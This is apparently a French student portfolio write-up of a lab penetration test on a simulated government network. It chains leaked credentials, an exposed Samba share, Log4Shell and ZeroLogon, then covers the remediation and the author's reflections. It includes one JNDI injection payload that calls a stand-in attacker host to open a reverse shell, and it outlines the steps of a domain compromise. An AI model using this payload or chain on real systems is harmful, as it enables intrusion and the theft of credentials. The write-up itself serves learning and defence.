II — Scénario

Chaîne d'attaque exploitée

L'attaque exploite une succession d'erreurs humaines et de vulnérabilités critiques, simulant un scénario réaliste d'intrusion ciblée sur une infrastructure gouvernementale.

01
Phase 1 — Accès initial
Fuite d'informations & accès Samba
Erreur humaine : un technicien a laissé des identifiants (antoine / dgfip) encodés en Base64 dans les commentaires HTML de la page de connexion du portail web.

Exposition Samba : une règle de NAT mal configurée sur le Stormshield expose le partage Samba (normalement interne) sur le WAN. L'attaquant récupère :
  • Un mail interne alertant sur la faille Log4Shell
  • Un plan réseau détaillé de l'infrastructure
02
Phase 2 — Compromission du serveur web
Log4Shell CVE-2021-44228
Le serveur Tomcat utilise Log4j v2.14.1, vulnérable à l'exécution de code à distance par injection JNDI. L'attaquant injecte la payload dans le champ "Numéro fiscal" du portail :
// Payload injectée dans le formulaire ${jndi:rmi://attacker.server:1099/shell} // Résultat : reverse shell sur le serveur Ubuntu DMZ // Le Stormshield en mode IDS laisse passer le flux (détecte mais ne bloque pas)
Résultat : contrôle total du serveur Ubuntu en DMZ via un reverse shell.
03
Phase 3 — Pivot & compromission du domaine
ZeroLogon CVE-2020-1472
Via Metasploit + Meterpreter, le serveur web compromis est transformé en tunnel pour atteindre le LAN (normalement invisible depuis l'extérieur).

L'attaquant cible le contrôleur de domaine Windows Server (192.168.121.9) via ZeroLogon — faille critique dans le protocole Netlogon permettant de réinitialiser le mot de passe machine sans authentification préalable :
Impact :
  • Réinitialisation du mot de passe de l'ordinateur du domaine
  • Dump de la base NTDS.dit (hashs NTLM de tous les comptes)
  • Élévation en Administrateur du Domaine
  • Accès total aux dossiers fiscaux et postes de travail

III — Remédiation

Mesures correctives appliquées

⚡
Log4Shell — CVE-2021-44228
Neutralisation immédiate de l'interprétation JNDI
Ajout de l'option JVM dans JAVA_OPTS pour bloquer l'interprétation des lookups JNDI dès le démarrage de Tomcat :
-Dlog4j2.formatMsgNoLookups=true

Action définitive : remplacement de tous les fichiers JAR de Log4j vulnérables par la version sécurisée 2.17.1.
🛡
ZeroLogon — CVE-2020-1472
Correction Windows Server & sécurisation Netlogon
Installation des mises à jour cumulatives Microsoft (Knowledge Base) corrigeant la vulnérabilité Netlogon.

Sécurisation renforcée : forçage via GPO de l'utilisation exclusive des canaux Netlogon sécurisés (Enforce Secure Channel) pour toutes les communications machine-contrôleur de domaine.
◈
Hardening général
Autres mesures préventives recommandées
  • Suppression des commentaires sensibles du code HTML (credentials)
  • Correction des règles NAT Stormshield — isolation effective du partage Samba
  • Passage du Stormshield en mode IPS actif (blocage, non seulement détection)
  • Segmentation stricte DMZ → LAN : interdire les connexions depuis un serveur compromis
  • Mise en place d'alertes Splunk sur les tentatives d'injection JNDI et les authentifications Netlogon anormales

💡
Ce que j'ai acquis. Ce projet m'a appris à raisonner en chaîne — comprendre qu'une compromission résulte rarement d'une seule faille, mais d'un enchaînement logique d'erreurs humaines et de vulnérabilités techniques. Réaliser les deux côtés (attaque et remédiation) a ancré cette compétence de façon durable.
⚡
Principale difficulté. La mise en œuvre de ZeroLogon a été la plus exigeante : comprendre le protocole Netlogon au niveau cryptographique pour saisir pourquoi la vulnérabilité fonctionnait nécessitait des recherches bien au-delà du simple PoC disponible.
🔄
Ce que je ferais différemment. J'aurais configuré Splunk dès le début pour observer en temps réel les traces laissées par mes propres attaques. Cela aurait enrichi l'analyse des IOC et rendu la partie remédiation encore plus pertinente et documentée.
